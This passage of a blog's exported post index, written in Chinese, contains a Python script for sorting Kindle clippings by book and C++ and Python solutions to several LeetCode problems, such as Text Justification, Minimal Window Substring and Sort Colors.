城市这篇文章，也是这样。&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 2.具体实现 每次读取书名，如果书名不存在，将其存入字典（py为dic,c++为map) 读完书名读两行，因为一行为日期，一行为空行。 用字典去寻找title对应下标index，将当前的笔记内容存入对应的content 3.Fix bugs 每次读取content应该去除末尾换行符''，否则判断和'=========='是否相等总为False 第一次读取title的时候，会读取三个字符，这是UTF引入的BOM来表示自身编码。去除即可。 修复linux下换行符引起的无限循环的问题（2015.4.7 ） 使用方法 windows下：将 kindle 笔记 My Clippings.txt放于 e盘根目录下，运行代码后，会在e盘生成result.txt linux下：自行修改路径，看备注直接使用当前路径也可以。 展示结果 the result of kindle note distribution Code 最终代码如下： 12345678910111213141516171819202122232425262728293031323334353637#!/usr/bin/env python# -*- coding: utf-8 -*-#kindle note v2.1#author: hrwhisper#date: 2015.4.7MyClippingsPath=&#x27;e:\\\\My Clippings.txt&#x27; #My Clippings.txt =&gt;linux当前目录OutPutPath=&#x27;e:\\\\result.txt&#x27; #result.txt =&gt;linuxtitle,content,dic=[],[],&#123;&#x27;a&#x27;:0&#125;with open(MyClippingsPath,&#x27;r&#x27;) as f: line = f.readline().strip(&#x27;\\xef\\xbb\\xbf&#x27;) while line : index=dic.get(line,-1) if index == -1: index = dic[line]=len(title) title.append(line) content.append(&#x27;&#x27;) f.readline() #time f.readline() #blank line while True: #content start line = f.readline().strip() if line == &#x27;==========&#x27; : break #content end content[index]+=line content[index]+=&#x27;\\n&#x27;*3 line = f.readline() #next clipping titlewith open(OutPutPath,&#x27;w&#x27;) as f: for i , titleName in enumerate(title): f.write(titleName+&#x27;\\n\\n&#x27;) f.write(content[dic[titleName]]) f.write(&#x27;\\n\\n==========\\n\\n&#x27;) print &#x27;ok&#x27;","categories":[{"name":"技术改变生活","slug":"技术改变生活","permalink":"https://www.hrwhisper.me/categories/%E6%8A%80%E6%9C%AF%E6%94%B9%E5%8F%98%E7%94%9F%E6%B4%BB/"},{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"OtherCodes","slug":"code/OtherCodes","permalink":"https://www.hrwhisper.me/categories/code/OtherCodes/"}],"tags":[{"name":"Cool","slug":"Cool","permalink":"https://www.hrwhisper.me/tags/Cool/"},{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"kindle","slug":"kindle","permalink":"https://www.hrwhisper.me/tags/kindle/"}]},{"title":"leetcode Text Justification","slug":"leetcode-text-justification","date":"2015-02-25T11:34:48.000Z","updated":"2021-01-08T13:32:16.879Z","comments":true,"path":"leetcode-text-justification/","link":"","permalink":"https://www.hrwhisper.me/leetcode-text-justification/","excerpt":"leetcode Text Justification Given an array of words and a length L, format the text such that each line has exactly L characters and is fully (left and right) justified. You should pack your words in a greedy approach; that is, pack as many words as you can in each line. Pad extra spaces ' ' when necessary so that each line has exactly_L_ characters. Extra spaces between words should be distributed as evenly as possible. If the number of spaces on a line do not divide evenly between words, the empty slots on the left will be assigned more spaces than the slots on the right. For the last line of text, it should be left justified and no extra space is inserted between words. For example, words: [\"This\", \"is\", \"an\", \"example\", \"of\", \"text\", \"justification.\"] L: 16. Return the formatted lines as: [ \"This is an\", \"example of text\", \"justification. \"] Note: Each word is guaranteed not to exceed L in length.","text":"leetcode Text Justification Given an array of words and a length L, format the text such that each line has exactly L characters and is fully (left and right) justified. You should pack your words in a greedy approach; that is, pack as many words as you can in each line. Pad extra spaces ' ' when necessary so that each line has exactly_L_ characters. Extra spaces between words should be distributed as evenly as possible. If the number of spaces on a line do not divide evenly between words, the empty slots on the left will be assigned more spaces than the slots on the right. For the last line of text, it should be left justified and no extra space is inserted between words. For example, words: [\"This\", \"is\", \"an\", \"example\", \"of\", \"text\", \"justification.\"] L: 16. Return the formatted lines as: [ \"This is an\", \"example of text\", \"justification. \"] Note: Each word is guaranteed not to exceed L in length. 题目地址：leetcode Text Justification 题意：给定n个单词，要求将这n个单词按照如下规则打印出来。 每一行长度为L。 单词与单词之间用空格隔开，如果总长度不够L，则补充额外的空格。单词与单纯之间空格数应尽可能相等。 最后一行单词与单词之间不需要补充额外的空格，但是长度也要L 思路：按照题目要求来呗。。。注意细节。 C++ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657class Solution &#123; public: vector&lt;string&gt; fullJustify(vector&lt;string&gt; &amp;words, int L) &#123; vector&lt;string&gt; ans; int n = words.size(); if (n == 0) return ans; for (int i = 0; i &lt; n;)&#123; int cur = i,curL=0; while (cur &lt; n)&#123; if (curL + words[cur].length() + cur - i &gt; L) break; curL += words[cur].length(); cur++; &#125; int tail = cur; string line; //last Line if (tail == n)&#123; for (int cur = i; cur &lt; tail; cur++)&#123; line = line + words[cur]; if (cur != tail - 1)&#123; curL++; line = line + &#x27; &#x27;; &#125; &#125; addSpace(line, L - curL); &#125; else&#123; int totBlank = L - curL; if (tail - i - 1 != 0) &#123; int avg = totBlank / (tail - i - 1); int remain = totBlank % (tail - i - 1); for (int cur = i; cur &lt; tail - 1; cur++)&#123; line = line + words[cur]; if (remain &gt; 0) addSpace(line, avg + 1); else addSpace(line, avg); remain--; &#125; line = line + words[tail - 1]; &#125; else&#123; line = line + words[tail - 1]; addSpace(line, totBlank); &#125; &#125; ans.push_back(line); i = tail; &#125; return ans; &#125; void addSpace(string &amp; line, int num)&#123; while (num--) line = line + &#x27; &#x27;; &#125; &#125;; Python 1234567891011121314151617181920212223242526272829303132333435363738394041class Solution: # @param words, a list of strings # @param L, an integer # @return a list of strings def fullJustify(self, words, L): ans , n ,i =[] , len(words) , 0 if not n : return ans while i &lt; n: cur , curL = i , 0 while cur &lt; n: if curL + len(words[cur]) + cur - i &gt; L : break curL , cur = curL + len(words[cur]) , cur + 1 tail ,line = cur , &#x27;&#x27; if tail == n: for cur in range(i,tail): line = line + words[cur] if cur != tail -1 : curL , line = curL+1 , line + &#x27; &#x27; line = line + &#x27; &#x27;*(L-curL) else : totBlank = L -curL if tail - i - 1 != 0: avg ,remain = totBlank / (tail - i - 1) ,totBlank % (tail - i - 1) for cur in range(i,tail-1): line = line + words[cur] if remain &gt; 0: line = line + &#x27; &#x27;*(avg+1) else: line = line + &#x27; &#x27; * avg remain-=1 line = line + words[tail - 1]; else: line = line + words[tail - 1] line = line + &#x27; &#x27;*(totBlank) ans.append(line) i=tail return ans","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode Largest Rectangle in Histogram ||  leetcode Maximal Rectangle","slug":"leetcode-largest-rectangle-in-histogram-and-leercode-maximal-rectangle","date":"2015-02-25T09:56:51.000Z","updated":"2021-01-08T13:32:16.852Z","comments":true,"path":"leetcode-largest-rectangle-in-histogram-and-leercode-maximal-rectangle/","link":"","permalink":"https://www.hrwhisper.me/leetcode-largest-rectangle-in-histogram-and-leercode-maximal-rectangle/","excerpt":"本次题解包括 84. Largest Rectangle in Histogram 85. Maximal Rectangle","text":"本次题解包括 84. Largest Rectangle in Histogram 85. Maximal Rectangle 84. Largest Rectangle in Histogram Given n non-negative integers representing the histogram’s bar height where the width of each bar is 1, find the area of largest rectangle in the histogram. img Above is a histogram where width of each bar is 1, given height = [2,1,5,6,2,3]. img The largest rectangle is shown in the shaded area, which has area = 10 unit. For example, Given heights = [2,1,5,6,2,3], return 10. 题目地址：leetcode Largest Rectangle in Histogram 题目大意：给定数组height表示矩形的高度，求矩形围城的矩形区域最大面积。 思路：很容易想到O(n^2)方法，枚举起始，枚举结束。。。用栈的话可以有O(N)的方法。 用一个栈来维护一个递增序列的下标： 如果当前的高度不大于栈顶的元素高度，那么pop并更新直到比当前元素的高度小的时候。更新的时候需要注意的是，用栈顶的高度作为计算的高（这样做的原因是栈顶的高一定比到当前下标i之间的元素来的小，这样就相当于有了起点和终点，这个区间可以采用当前栈顶的高）所以宽度为i - 1 - q.top() （i不计算在内，故-1,）当q为空时候，说明当前高度是“有史以来”最小的，宽度应该为i。 否则把当前下标入栈。 当全部元素都过完一遍，但是栈不为空的时候，可以想象为height[n]==int_min的时候，按第一步进行更新。 C++ 12345678910111213141516171819202122232425class Solution &#123; public: int largestRectangleArea(vector&lt;int&gt; &amp;height) &#123; stack&lt;int&gt; q; int n = height.size(); int ans = 0, curArea; for (int i = 0; i &lt; n; i++)&#123; while (!q.empty() &amp;&amp; height[q.top()] &gt;= height[i])&#123; int h = height[q.top()]; q.pop(); int width = q.empty() ? i : i - 1 - q.top(); if (width * h &gt; ans) ans = h*width; &#125; q.push(i); &#125; while (!q.empty())&#123; int h = height[q.top()]; q.pop(); int width = q.empty() ? n : n - 1 - q.top(); if (width * h &gt; ans) ans = h * width; &#125; return ans; &#125; &#125;; Python 1234567891011121314151617181920class Solution(object): def largestRectangleArea(self, heights): &quot;&quot;&quot; :type heights: List[int] :rtype: int &quot;&quot;&quot; q = [] ans = 0 for i, height in enumerate(heights): while q and heights[q[-1]] &gt; height: h = heights[q.pop()] w = i - 1 - q[-1] if q else i ans = max(ans, h * w) q.append(i) n = len(heights) while q: h = heights[q.pop()] w = n - 1 - q[-1] if q else n ans = max(ans, h * w) return ans 85. Maximal Rectangle Given a 2D binary matrix filled with 0's and 1's, find the largest rectangle containing all ones and return its area. 题目地址：leetcode Maximal Rectangle 题目大意：给定由0和1组成的矩阵，求由1构成的最大矩阵。如： 0110 1010为2. 思路：设dp[i][j]为(i,j)这列上连续1的个数，然后就相当于求给定矩形高度，求最大矩形面积。。 你就秒懂之一图流： （到最后一行可以转化为给定高度为：0,1,2,3的矩形， 求其最大矩形面积） QQ截图20150226231110 就是上面那一题。 leetcode两题放一起真是用心良苦。。 C++ 12345678910111213141516171819202122232425262728293031323334353637class Solution &#123; int largestRectangleArea(vector&lt;int&gt;&amp; heights) &#123; stack&lt;int&gt; q; int ans = 0, n = heights.size(); for (int i = 0; i &lt; n; ++i) &#123; while (!q.empty() &amp;&amp; heights[i] &lt;= heights[q.top()]) &#123; int h = heights[q.top()]; q.pop(); int w = q.empty() ? i : i - 1 - q.top(); if (w * h &gt; ans) ans = w * h; &#125; q.push(i); &#125; while (!q.empty()) &#123; int h = heights[q.top()]; q.pop(); int w = q.empty() ? n : n - 1 - q.top(); if (w * h &gt; ans) ans = w * h; &#125; return ans; &#125;public: int maximalRectangle(vector&lt;vector&lt;char&gt;&gt;&amp; matrix) &#123; if (matrix.empty() || matrix[0].empty()) return 0; vector&lt;int&gt; pre_sum(matrix[0].size(), 0); int ans = 0; for (int i = 0; i &lt; matrix.size(); ++i) &#123; for (int j = 0; j &lt; matrix[0].size(); ++j) &#123; pre_sum[j] = matrix[i][j] == &#x27;0&#x27; ? 0 : pre_sum[j] + 1; &#125; ans = max(ans, largestRectangleArea(pre_sum)); &#125; return ans; &#125;&#125;; Python 1234567891011121314151617181920212223242526272829303132333435class Solution(object): def largestRectangleArea(self, heights): &quot;&quot;&quot; :type heights: List[int] :rtype: int &quot;&quot;&quot; ans = 0 q = [] for i in range(len(heights)): while q and heights[i] &lt;= heights[q[-1]]: h = heights[q.pop()] w = i - 1 - q[-1] if q else i ans = max(ans, h * w) q.append(i) while q: h = heights[q.pop()] w = len(heights) - 1 - q[-1] if q else len(heights) ans = max(ans, h * w) return ans def maximalRectangle(self, matrix): &quot;&quot;&quot; :type matrix: List[List[str]] :rtype: int &quot;&quot;&quot; if not matrix or not matrix[0]: return 0 pre_sum = [0] * len(matrix[0]) ans = 0 for i in range(len(matrix)): for j in range(len(matrix[0])): pre_sum[j] = 0 if matrix[i][j] == &#x27;0&#x27; else pre_sum[j] + 1 ans = max(ans, self.largestRectangleArea(pre_sum)) return ans 本文是leetcode如下的题解 84. Largest Rectangle in Histogram 85. Maximal Rectangle 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"leetcode Minimum Window Substring","slug":"leetcode-minimum-window-substring","date":"2015-02-24T12:18:32.000Z","updated":"2021-01-08T13:32:16.855Z","comments":true,"path":"leetcode-minimum-window-substring/","link":"","permalink":"https://www.hrwhisper.me/leetcode-minimum-window-substring/","excerpt":"leetcode Minimum Window Substring Given a string S and a string T, find the minimum window in S which will contain all the characters in T in complexity O(n). For example, S = \"ADOBECODEBANC\" T = \"ABC\" Minimum window is \"BANC\". Note: If there is no such window in S that covers all characters in T, return the emtpy string \"\". If there are multiple such windows, you are guaranteed that there will always be only one unique minimum window in S.","text":"leetcode Minimum Window Substring Given a string S and a string T, find the minimum window in S which will contain all the characters in T in complexity O(n). For example, S = \"ADOBECODEBANC\" T = \"ABC\" Minimum window is \"BANC\". Note: If there is no such window in S that covers all characters in T, return the emtpy string \"\". If there are multiple such windows, you are guaranteed that there will always be only one unique minimum window in S. 题目地址：leetcode Minimum Window Substring 题目大意: 给定两个字符串S和T，求在S中的一个窗格，使得T中所有字母都出现。 思路： 又是two pointers的思想。一个指针指向出现的所有字符的结尾，然后用一个开头指针看看能不能将窗格变短。 可以用数组target记录t中各个字符的个数。然后扫描s，并记录当前区间[start, i]的字符个数（用count数组）。当满足count中都大于target时，说明合法，此时尝试缩短区间（start++） C++ 123456789101112131415161718192021222324252627282930class Solution &#123; bool check(int count[128], int target[128]) &#123; for (int i = 0; i &lt; 128; ++i) if (count[i] &lt; target[i]) return false; return true; &#125;public: string minWindow(string s, string t) &#123; int count[128] = &#123; 0 &#125;, target[128] = &#123; 0 &#125;; for (char c : t) ++target[c]; int start = 0, ans_s = 0, ans_e = s.size() + 2; for (int i = 0; i &lt; s.size(); ++i) &#123; ++count[s[i]]; while (check(count, target)) &#123; while (start &lt; i &amp;&amp; target[s[start]] == 0) --count[s[start++]]; if (i - start &lt; ans_e - ans_s) &#123; ans_s = start; ans_e = i; &#125; --count[s[start++]]; &#125; &#125; return ans_e - ans_s + 1 &lt;= s.size() ? s.substr(ans_s, ans_e - ans_s + 1) : &quot;&quot;; &#125;&#125;; 另一种单数组版本写法： 但其实可以只用一个数组完成。 仍用target记录t中各个字符的个数，cnt = len(t)即需要的字符个数 然后扫描s, 若target[s[i]] &gt; 0 ，则说明s[i]是t中的字符，cnt-=1 若cnt == 0，说明从[start, i]的都在t中，满足条件，此时尝试增大start，缩小区间。 C++ 1234567891011121314151617181920212223242526class Solution &#123;public: string minWindow(string s, string t) &#123; vector&lt;int&gt; target(128, 0); for (char c : t) ++target[c]; int cnt = t.size(), start = 0; int ans_s = 0, ans_e = s.size() + 1; for (int i = 0; i &lt; s.size(); ++i) &#123; if (target[s[i]]-- &gt; 0) //s[i] in t --cnt; while (cnt == 0) &#123; // found [start, i] in t if (i - start &lt; ans_e - ans_s) &#123; ans_s = start; ans_e = i; &#125; if (++target[s[start]] &gt; 0) //s[start] is t&#x27;s element ++cnt; ++start; &#125; &#125; int len = ans_e - ans_s + 1; return len &lt;= s.size() ? s.substr(ans_s, len) : &quot;&quot;; &#125;&#125;; Python 123456789101112131415161718192021222324252627class Solution(object): def minWindow(self, s, t): &quot;&quot;&quot; :type s: str :type t: str :rtype: str &quot;&quot;&quot; target = [0] * 128 for c in t: target[ord(c)] += 1 cnt, start = len(t), 0 ans_s, ans_e = 0, len(s) + 1 for i in range(len(s)): if target[ord(s[i])] &gt; 0: cnt -= 1 target[ord(s[i])] -= 1 while cnt == 0: if i - start &lt; ans_e - ans_s: ans_s, ans_e = start, i if target[ord(s[start])] == 0: cnt += 1 target[ord(s[start])] += 1 start += 1 return &quot;&quot; if ans_e - ans_s + 1 &gt; len(s) else s[ans_s: ans_e + 1] 本文是leetcode如下的题解 76. Minimum Window Substring 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"leetcode Remove Duplicates 整理","slug":"leetcode-remove-duplicates-from-sorted-array-or-remove-duplicates-from-sorted-list","date":"2015-02-23T13:53:55.000Z","updated":"2021-01-08T13:32:16.865Z","comments":true,"path":"leetcode-remove-duplicates-from-sorted-array-or-remove-duplicates-from-sorted-list/","link":"","permalink":"https://www.hrwhisper.me/leetcode-remove-duplicates-from-sorted-array-or-remove-duplicates-from-sorted-list/","excerpt":"26. Remove Duplicates from Sorted Array 80. Remove Duplicates from Sorted Array II 82. Remove Duplicates from Sorted List II 83. Remove Duplicates from Sorted List","text":"26. Remove Duplicates from Sorted Array 80. Remove Duplicates from Sorted Array II 82. Remove Duplicates from Sorted List II 83. Remove Duplicates from Sorted List 26. Remove Duplicates from Sorted Array Given a sorted array, remove the duplicates in-place such that each element appear only once and return the new length. Do not allocate extra space for another array, you must do this by modifying the input array in-place with O(1) extra memory. Example: Given nums = [1,1,2], Your function should return length = 2, with the first two elements of nums being 1 and 2 respectively. It doesn't matter what you leave beyond the new length. 题目地址：leetcode Remove Duplicates from Sorted Array 题目大意：给定排好序的数组,去除其重复元素并返回去除后长度。 思路： 用len记录新的长度。当nums[i] != nums[i - 1]的时候，说明不是重复元素。 C++ 123456789101112class Solution &#123;public: int removeDuplicates(vector&lt;int&gt;&amp; nums) &#123; if(nums.empty()) return 0; int len = 1; for(int i = 1; i &lt; nums.size(); ++i)&#123; if(nums[i] != nums[i - 1]) nums[len++] = nums[i]; &#125; return len; &#125;&#125;; Python 123456789101112class Solution(object): def removeDuplicates(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: int &quot;&quot;&quot; j = 1 if nums else 0 for i in range(1, len(nums)): if nums[i] != nums[i - 1]: nums[j] = nums[i] j += 1 return j 80. Remove Duplicates from Sorted Array II Follow up for \"Remove Duplicates\": What if duplicates are allowed at most twice? For example, Given sorted array nums = [1,1,1,2,2,3], Your function should return length = 5, with the first five elements of nums being 1, 1, 2, 2 and 3. It doesn't matter what you leave beyond the new length. 题目地址：leetcode Remove Duplicates from Sorted Array II 题目大意：给定排好序的数组，去除其重复元素（每个元素最多重复两次）并返回去除后长度。 思路： 方法1 i指向当前元素的第一个位置，j指向下一个元素第一位置。 j-i &gt;＝２说明有两个元素，应在写一次。复杂度为O(n) C++ 1234567891011121314class Solution &#123;public: int removeDuplicates(vector&lt;int&gt;&amp; nums) &#123; if(nums.size() &lt;= 2) return nums.size(); int len = 0; for(int i = 0, j = 1; i &lt; nums.size(); i = j++)&#123; while(j &lt; nums.size() &amp;&amp; nums[i] == nums[j]) ++j; nums[len++] = nums[i]; if(j - i &gt;= 2) nums[len++] = nums[i]; &#125; return len; &#125;&#125;; Python 12345678910111213141516171819class Solution(object): def removeDuplicates(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: int &quot;&quot;&quot; if len(nums) &lt;= 2: return len(nums) k = 0 # new length i, j = 0, 1 while i &lt; len(nums): while j &lt; len(nums) and nums[i] == nums[j]: j += 1 nums[k] = nums[i] k += 1 if j - i &gt;= 2: nums[k] = nums[i] k += 1 i, j = j, j + 1 return k 方法2 类似第26题的做法， 用len记录新数组长度，在遍历过程中，len就是指向放置新元素的位置。 则若nums[i] != nums[len - 2]， 说明应该存放，因为新数组中不超过2个值为nums[i]的元素。 注意这里应写len - 2而不是i - 2，因为i - 2可能被覆盖。就是样例的[1,1,1,2,2,3] C++ 123456789101112class Solution &#123;public: int removeDuplicates(vector&lt;int&gt;&amp; nums) &#123; if(nums.size() &lt;= 2) return nums.size(); int len = 2; for(int i = 2; i &lt; nums.size(); ++i)&#123; if(nums[i] != nums[len - 2]) nums[len++] = nums[i]; &#125; return len; &#125;&#125;; Python 12345678910111213class Solution(object): def removeDuplicates(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: int &quot;&quot;&quot; if len(nums) &lt;= 2: return len(nums) k = 2 for i in range(2, len(nums)): if nums[i] != nums[k - 2]: nums[k] = nums[i] k += 1 return k 83. Remove Duplicates from Sorted List Given a sorted linked list, delete all duplicates such that each element appear only once. For example, Given 1-&gt;1-&gt;2, return 1-&gt;2. Given 1-&gt;1-&gt;2-&gt;3-&gt;3, return 1-&gt;2-&gt;3. 题目地址：leetcode Remove Duplicates from Sorted List 题目大意：给定排好序的链表，对于重复元素仅保留一个。 思路：看代码吧 C++ 12345678910111213141516171819class Solution &#123;public: ListNode* deleteDuplicates(ListNode* head) &#123; if(!head) return head; ListNode *p = head, *q = head-&gt;next, *t = nullptr; while(q)&#123; if(p-&gt;val == q-&gt;val)&#123; t = q; p-&gt;next = q = q-&gt;next; delete t; &#125; else&#123; p = q; q = q-&gt;next; &#125; &#125; return head; &#125;&#125;; Python 123456789101112class Solution: # @param head, a ListNode # @return a ListNode def deleteDuplicates(self, head): p, q = ListNode(-1), head p.next, head = head, p while q: while q.next and q.next.val == q.val: q = q.next p.next, p = q, q if q: q = q.next return head.next 82. Remove Duplicates from Sorted List II Given a sorted linked list, delete all nodes that have duplicate numbers, leaving only distinct numbers from the original list. For example, Given 1-&gt;2-&gt;3-&gt;3-&gt;4-&gt;4-&gt;5, return 1-&gt;2-&gt;5. Given 1-&gt;1-&gt;1-&gt;2-&gt;3, return 2-&gt;3. 题目地址：leetcode Remove Duplicates from Sorted List II 题目大意：给定排好序的链表，取出所有重复元素。 思路：和上面一题(83)区别在于不保留重复元素。 当q==p-&gt;next说明无重复元素，应该p=q 否则，p-&gt;next=q-&gt;next C++ 12345678910111213141516171819202122232425262728class Solution &#123;public: ListNode* deleteDuplicates(ListNode* head) &#123; if (!head) return head; ListNode *dummy = new ListNode(-1); dummy-&gt;next = head; ListNode *p = dummy, *q = head, *temp = nullptr; while (q) &#123; while (q-&gt;next &amp;&amp; q-&gt;next-&gt;val == q-&gt;val) q = q-&gt;next; if (p-&gt;next == q) p = q; else &#123; //delete[p-&gt;next, q] for (ListNode *it = p-&gt;next; it != q; ) &#123; temp = it; it = it-&gt;next; delete temp; &#125; p-&gt;next = q-&gt;next; delete q; &#125; q = p-&gt;next; &#125; head = dummy-&gt;next; delete dummy; return head; &#125;&#125;; Python 1234567891011121314151617class Solution(object): def deleteDuplicates(self, head): &quot;&quot;&quot; :type head: ListNode :rtype: ListNode &quot;&quot;&quot; p, q = ListNode(-1), head p.next, head = head, p while q: while q.next and q.next.val == q.val: q = q.next if p.next == q: p = q else: p.next = q.next q = p.next return head.next 本文是leetcode如下的题解 26. Remove Duplicates from Sorted Array 80. Remove Duplicates from Sorted Array II 82. Remove Duplicates from Sorted List II 83. Remove Duplicates from Sorted List 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"leetcode Sort Colors","slug":"leetcode-sort-colors","date":"2015-02-23T13:35:15.000Z","updated":"2021-01-08T13:32:16.868Z","comments":true,"path":"leetcode-sort-colors/","link":"","permalink":"https://www.hrwhisper.me/leetcode-sort-colors/","excerpt":"leetcode Sort Colors Given an array with n objects colored red, white or blue, sort them so that objects of the same color are adjacent, with the colors in the order red, white and blue. Here, we will use the integers 0, 1, and 2 to represent the color red, white, and blue respectively. Note: You are not suppose to use the library's sort function for this problem. Follow up: A rather straight forward solution is a two-pass algorithm using counting sort. First, iterate the array counting number of 0's, 1's, and 2's, then overwrite array with total number of 0's, then 1's and followed by 2's. Could you come up with an one-pass algorithm using only constant space?","text":"leetcode Sort Colors Given an array with n objects colored red, white or blue, sort them so that objects of the same color are adjacent, with the colors in the order red, white and blue. Here, we will use the integers 0, 1, and 2 to represent the color red, white, and blue respectively. Note: You are not suppose to use the library's sort function for this problem. Follow up: A rather straight forward solution is a two-pass algorithm using counting sort. First, iterate the array counting number of 0's, 1's, and 2's, then overwrite array with total number of 0's, then 1's and followed by 2's. Could you come up with an one-pass algorithm using only constant space? 题目地址：leetcode Sort Colors 题目大意: 一个数组中，0代表红色，1代表白色，2代表蓝色。请按照红-白-蓝色的顺序排好。不能使用sort函数。 思路： 方法1 就三种元素，直接计数排序即可。 C++ 1234567891011class Solution &#123;public: void sortColors(vector&lt;int&gt;&amp; nums) &#123; int count[3] = &#123;0&#125;; for(const int num: nums) ++count[num]; for(int i = 0, j = 0; j &lt;= 2; ++j) while(count[j]--) nums[i++] = j; &#125;&#125;; Python 1234567891011121314class Solution(object): def sortColors(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: void Do not return anything, modify nums in-place instead. &quot;&quot;&quot; count = [0] * 3 for num in nums: count[num] += 1 i = 0 for j in range(3): for _ in range(count[j]): nums[i] = j i += 1 方法2 交换元素，设l为0结尾+1，r为2的开头-1的位置 于是我们可以用i 遍历， 从[0,r] nums[i] == 0: 交换nums[l] 和nums[i]，l++，i++ nums[i] == 2： 交换nums[r]和nums[i]，r--(注意交换后nums[i]可能变为0，因此i不+1) nums[i] == 1： i++ C++ 1234567891011121314class Solution &#123;public: void sortColors(vector&lt;int&gt;&amp; nums) &#123; int l = 0, r = nums.size() - 1; for(int i = 0; i &lt;= r; )&#123; if(nums[i] == 0) swap(nums[i++], nums[l++]); else if(nums[i] == 2) swap(nums[i], nums[r--]); else ++i; &#125; &#125;&#125;; Python 12345678910111213141516class Solution(object): def sortColors(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: void Do not return anything, modify nums in-place instead. &quot;&quot;&quot; i, l, r = 0, 0, len(nums) - 1 while i &lt;= r: if nums[i] == 0: nums[i], nums[l] = nums[l], nums[i] i, l = i + 1, l + 1 elif nums[i] == 2: nums[i], nums[r] = nums[r], nums[i] r -= 1 else: i += 1 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"leetcode Set Matrix Zeroes","slug":"leetcode-set-matrix-zeroes","date":"2015-02-20T09:58:28.000Z","updated":"2021-01-08T13:32:16.845Z","comments":true,"path":"leetcode-set-matrix-zeroes/","link":"","permalink":"https://www.hrwhisper.me/leetcode-set-matrix-zeroes/","excerpt":"leetcode Set Matrix Zeroes Given a m x n matrix, if an element is 0, set its entire row and column to 0. Do it in place. Follow up:Did you use extra space? A straight forward solution using O(_m__n_) space is probably a bad idea. A simple improvement uses O(m + n) space, but still not the best solution. Could you devise a constant space solution?","text":"leetcode Set Matrix Zeroes Given a m x n matrix, if an element is 0, set its entire row and column to 0. Do it in place. Follow up:Did you use extra space? A straight forward solution using O(_m__n_) space is probably a bad idea. A simple improvement uses O(m + n) space, but still not the best solution. Could you devise a constant space solution? 题目地址：leetcode Set Matrix Zeroes 题目大意: 给定一个矩阵，如果它其中的某个元素为0，那么该元素所在行和所在列均变为0. 思路： 创建一个矩阵的拷贝，然后根据这个拷贝进行判断O(MN) 创建一个数组，记录矩阵为0的行和列下标O(m+n) 把有0的元素映射到首行和首列 Python 方法1 12345678910111213141516class Solution: # @param matrix, a list of lists of integers # RETURN NOTHING, MODIFY matrix IN PLACE. def setZeroes(self, matrix): m , n = len(matrix), len(matrix[0]) temp = [[matrix[i][j] for j in range(n)] for i in range(m)] for i in range(m): for j in range(n): if not temp[i][j]: self.setZero(i,j,n,m,matrix) def setZero(self,row,col,n,m,matrix): for i in range(m): matrix[i][col]=0 for j in range(n): matrix[row][j]=0 Python 方法2 123456789101112131415161718192021class Solution: # @param matrix, a list of lists of integers # RETURN NOTHING, MODIFY matrix IN PLACE. def setZeroes(self, matrix): m , n = len(matrix), len(matrix[0]) row , col = [0 for i in range(m)] , [0 for i in range(n)] for i in range(m): for j in range(n): if not matrix[i][j]: row[i]=col[j]=1 for i in range(m): if row[i]: for j in range(n): matrix[i][j]=0 for j in range(n): if col[j]: for i in range(m): matrix[i][j]=0 Python 方法3 123456789101112131415161718192021class Solution(object): def setZeroes(self, matrix): &quot;&quot;&quot; :type matrix: List[List[int]] :rtype: void Do not return anything, modify matrix in-place instead. &quot;&quot;&quot; m, n, col0_zero = len(matrix), len(matrix[0]), False for i in range(m): if not matrix[i][0]: col0_zero = True for j in range(1, n): if not matrix[i][j]: matrix[i][0] = matrix[0][j] = 0 for i in range(m - 1, -1, -1): for j in range(n - 1, 0, -1): if (not matrix[i][0]) or (not matrix[0][j]): matrix[i][j] = 0 if col0_zero: matrix[i][0] = 0 C++方法3 123456789101112131415161718192021class Solution &#123;public: void setZeroes(vector&lt;vector&lt;int&gt;&gt;&amp; matrix) &#123; bool col0_zero = false; //第一列是否为0 for(int i = 0; i &lt; matrix.size(); ++i)&#123; 